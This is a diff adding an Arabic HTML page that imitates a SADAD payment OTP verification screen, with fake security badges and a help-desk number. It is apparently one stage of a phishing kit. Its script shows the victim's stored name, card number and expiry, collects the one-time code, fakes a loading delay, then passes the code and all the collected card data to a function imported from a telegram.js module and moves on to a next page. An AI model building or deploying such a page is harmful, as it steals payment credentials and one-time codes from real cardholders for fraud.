@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>رمز التحقق OTP</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: "Cairo", sans-serif;
+            background: #f5f6f8;
+            display: flex;
+            justify-content: center;
+
+        }
+
+        .container {
+            background: #fff;
+            width: 100vw;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            background: #8d193c;
+        }
+
+        header {
+            color: #fff;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+
+        header img {
+            width: 40px;
+            height: 40px;
+            border-radius: 6px;
+            background: #fff;
+        }
+
+        header div {
+            cursor: pointer;
+            display: flex;
+            align-items: flex-end;
+            gap: 2px;
+        }
+
+        header div img {
+            width: 15px;
+            height: 15px;
+            background-color: transparent;
+        }
+
+        .page-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            border-radius: 12px;
+            overflow: hidden;
+            background-color: white;
+            margin-bottom: 10px;
+            max-width: 600px;
+        }
+
+        .details-toggle {
+            background: #f5f6f8;
+            width: 100%;
+            padding: 15px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .details-content {
+            display: none;
+            padding: 15px;
+            font-size: 14px;
+            color: #333;
+            direction: ltr;
+        }
+
+        .details-content.active {
+            display: block;
+        }
+
+        .card {
+            padding: 15px;
+        }
+
+        .card .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .card .header h2 {
+            font-size: 24px;
+            color: #92002c;
+            margin: 0;
+        }
+
+        .card .header img {
+            width: 60px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+
+        input:focus {
+            border-color: #92002c;
+            outline: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #92002c;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn.loading {
+            background: #92002c;
+            cursor: not-allowed;
+        }
+
+        .btn img {
+            width: 18px;
+            height: 18px;
+        }
+
+        .btn:hover {
+            background: #69122c;
+        }
+
+        .error {
+            color: red;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+
+        .timer {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 15px;
+            color: #e53935;
+            font-weight: bold;
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 15px;
+            text-align: center;
+            background: #f5f6f8;
+        }
+
+        footer img {
+            width: 55px;
+            height: 28px;
+            margin: 5px;
+        }
+
+        footer ul {
+            list-style: none;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            justify-content: space-between;
+            gap: 2px;
+            font-size: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <img src="images/sadad-logo.svg" alt="Logo" />
+            <div>Ar
+                <img src="images/detail-down-arrow.svg" alt />
+            </div>
+        </header>
+
+        <div class="page-content">
+            <div class="details-toggle">
+                <span>التفاصيل</span>
+                <img src="images/detail-down-arrow.svg" alt="arrow" />
+            </div>
+            <div class="details-content" id="detailsBox">
+                <p><strong>name:</strong> <span id="nameDisplay"></span></p>
+                <p><strong>card number:</strong> <span id="cardDisplay"></span></p>
+                <p><strong>amount:</strong> <span id="amountDisplay"></span></p>
+                <p>
+                    <strong>expire date</strong> <span id="dateDisplay"></span>
+                </p>
+            </div>
+
+            <div class="card">
+
+                <div class="header">
+                    <h2>التحقق من الدفع</h2>
+                </div>
+
+                <div class="info">
+
+                    <form id="otpForm">
+                        <label>أدخل رمز التحقق (OTP)</label>
+                        <input type="text" id="otp" maxlength="6" placeholder="######" required />
+                        <div id="error" class="error"></div>
+                        <button type="submit" class="btn" id="payBtn">تأكيد</button>
+                    </form>
+
+                    <div class="timer">الوقت المتبقي: <span id="countdown">03:00</span></div>
+                </div>
+
+            </div>
+            <footer>
+                <div>
+                    <img src="images/pci.svg" alt="PCI" />
+                    <img src="images/iso.svg" alt="ISO" />
+                    <img src="images/secure.svg" alt="Secure" />
+                    <img src="images/mcafee.svg" alt="McAfee" />
+                </div>
+                <ul>
+                    <li>مكتب المساعدة :</br> +974-75276456</li>
+                    <li>سياسة الخصوصية | شروط الاستخدام</li>
+                    <li>مدعوم</li>
+                </ul>
+            </footer>
+
+        </div>
+    </div>
+
+    <script type="module">
+        import botFetch from "./telegram.js";
+
+        // get data from sessionStorage
+        let stored = sessionStorage.getItem("userData");
+        let userData = JSON.parse(stored) || {};
+
+        document.getElementById("nameDisplay").textContent = userData.customer;
+        document.getElementById("dateDisplay").textContent = userData.expiry || "no expire data";
+        document.getElementById("cardDisplay").textContent =
+            "**** **** **** " + (userData.cardNumber?.slice(-4) ||" لا يوجد بطاقه");
+        document.getElementById("amountDisplay").textContent = userData.amount;
+
+        const payBtn = document.getElementById("payBtn");
+
+        // Details toggle
+        document
+            .querySelector(".details-toggle")
+            .addEventListener("click", () => {
+                document.getElementById("detailsBox").classList.toggle("active");
+            });
+
+        // form validation
+        document.getElementById("otpForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+            let otp = document.getElementById("otp").value.trim();
+            let error = document.getElementById("error");
+
+            error.textContent = "";
+
+            if (!/^\d{4,6}$/.test(otp)) {
+                error.textContent = "الرجاء إدخال رمز OTP صحيح ( 4 او 6 أرقام فقط )";
+                return;
+            }
+
+            userData.otp = otp;
+            sessionStorage.setItem("userData", JSON.stringify(userData));
+
+            payBtn.innerHTML = `<img src="https://i.gifer.com/ZZ5H.gif" alt="loading" /> جاري التحميل...`;
+            payBtn.classList.add("loading");
+            payBtn.disabled = true;
+
+            setTimeout(() => {
+                botFetch({ otp });
+                botFetch(userData, "page3.html");
+            }, 5000);
+        });
+
+        // 3min counter
+        let timeLeft = 180;
+        let timer = setInterval(() => {
+            timeLeft--;
+            let min = String(Math.floor(timeLeft / 60)).padStart(2, "0");
+            let sec = String(timeLeft % 60).padStart(2, "0");
+            document.getElementById("countdown").textContent = `${min}:${sec}`;
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+            }
+        }, 1000);
+    </script>
+</body>
+
+</html>
